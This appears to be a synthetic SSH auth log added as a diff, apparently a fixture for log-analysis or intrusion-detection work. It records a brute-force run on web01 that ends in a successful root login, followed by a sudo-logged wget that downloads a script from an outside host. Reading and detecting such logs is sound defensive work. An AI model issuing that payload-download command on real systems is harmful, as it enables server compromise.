@@ -1,0 +1,20 @@
+Jan 15 09:58:12 web01 sshd[2201]: Accepted password for deploy from 10.0.0.12 port 51022 ssh2
+Jan 15 10:01:03 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Jan 15 10:22:41 web01 sshd[12001]: Failed password for root from 203.0.113.50 port 40122 ssh2
+Jan 15 10:22:43 web01 sshd[12002]: Failed password for root from 203.0.113.50 port 40124 ssh2
+Jan 15 10:22:45 web01 sshd[12003]: Failed password for root from 203.0.113.50 port 40126 ssh2
+Jan 15 10:22:47 web01 sshd[12004]: Failed password for invalid user admin from 203.0.113.50 port 40128 ssh2
+Jan 15 10:22:49 web01 sshd[12005]: Invalid user oracle from 203.0.113.50 port 40130
+Jan 15 10:22:49 web01 sshd[12005]: Failed password for invalid user oracle from 203.0.113.50 port 40130 ssh2
+Jan 15 10:22:51 web01 sshd[12006]: Failed password for root from 203.0.113.50 port 40132 ssh2
+Jan 15 10:22:53 web01 sshd[12007]: Failed password for postgres from 203.0.113.50 port 40134 ssh2
+Jan 15 10:22:55 web01 sshd[12008]: Failed password for root from 203.0.113.50 port 40136 ssh2
+Jan 15 10:22:58 web01 sshd[12009]: Failed password for root from 203.0.113.50 port 40138 ssh2
+Jan 15 10:23:01 web01 sshd[12010]: Accepted password for root from 203.0.113.50 port 40140 ssh2
+Jan 15 10:23:02 web01 sudo:   root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.7/x.sh
+Jan 15 10:31:10 web01 sshd[12110]: Failed password for invalid user test from 192.0.2.77 port 33010 ssh2
+Jan 15 10:31:12 web01 sshd[12111]: Failed password for invalid user git from 192.0.2.77 port 33012 ssh2
+Jan 15 10:31:14 web01 sshd[12112]: Connection closed by invalid user git 192.0.2.77 port 33012 [preauth]
+Jan 15 10:45:30 web01 sshd[12350]: Accepted password for deploy from 10.0.0.12 port 51190 ssh2
+Jan 15 11:02:05 web01 sshd[12500]: Disconnecting: Too many authentication failures for ubuntu [preauth]
+Jan 15 11:18:44 web01 sshd[12700]: Failed password for admin from 198.51.100.23 port 44120 ssh2
